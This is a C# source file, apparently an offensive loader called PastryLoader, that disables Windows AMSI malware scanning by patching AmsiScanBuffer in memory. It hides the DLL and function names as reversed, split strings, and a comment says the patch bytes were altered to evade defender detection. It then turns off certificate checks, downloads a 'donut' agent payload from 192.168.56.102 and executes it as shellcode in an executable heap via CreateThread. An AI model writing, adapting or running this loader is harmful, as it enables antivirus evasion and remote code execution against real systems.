using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Net;

//This is to load ayyyygehnt via donut.
namespace PastryLoader
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpfOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize,
        UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)]
        public static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public const UInt32 INFINITE = 0xFFFFFFFF;
        public enum AllocationType : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        public enum MEM_TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }


        static void Main(string[] args)
        {
            if (!HelloTest()) { return; }
            ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
            var data = DownloadAttemptOne("http://192.168.56.102:9000/agentdonut.bin");
            if (data == null) { return; }
            if (!HelloCode(data)) { return; }
        }
        public static bool HelloTest()
        {
            byte[] patchs;
            patchs = new byte[6] { 0x50, 0x58, 0x53, 0x5B, 0x90, 0xC3 };
            // confirmed works. needed to change the bytes to stop the blue shield.
            try
            {
                string l = "lld." + "ism" + "a";
                string f = "re" + "ff" + "uBnac" + "Sis" + "mA";
                char[] larray = l.ToCharArray();
                Array.Reverse(larray);
                l = new string(larray);
                char[] farray = f.ToCharArray();
                Array.Reverse(farray);
                f = new string(farray);
                var lib = LoadLibrary(l);
                var addr = GetProcAddress(lib, f);
                if (addr == null) { return true; }
                uint oldProtect;
                if (!VirtualProtect(addr, patchs.Length, 0x40, out oldProtect)) { return false; }
                Marshal.Copy(patchs, 0, addr, patchs.Length);
                if (!VirtualProtect(addr, patchs.Length, oldProtect, out oldProtect)) { return false; }
                return true;
            }
            catch
            {
                return false;

            }
        }
        public static bool HelloCode(byte[] data)
        {

            var heap = HeapCreate((uint)0x00040000, (UIntPtr)data.Length+100,(UIntPtr)0);
            var baseAddr = HeapAlloc(heap, 0, (UIntPtr)data.Length + 1);
            if (baseAddr == IntPtr.Zero)
            {
                return false;
            }
            Marshal.Copy(data, 0, baseAddr, data.Length);
            var thread = CreateThread(
                IntPtr.Zero,
                0,
                baseAddr,
                IntPtr.Zero,
                0,
                out var hThread
                );
            if (thread == IntPtr.Zero)
            {
                return false;
            }
            WaitForSingleObject(thread, INFINITE);
            HeapFree(heap, 0, baseAddr);
            return true;
        }
        public static byte[] DownloadAttemptOne(string url)
        {
            try
            {
                byte[] dataBytes;
                using (var client = new WebClient())
                {
                    dataBytes = client.DownloadData(url);
                }
                return dataBytes;
            }
            catch
            {
                return null;
            }
        }
    }
}
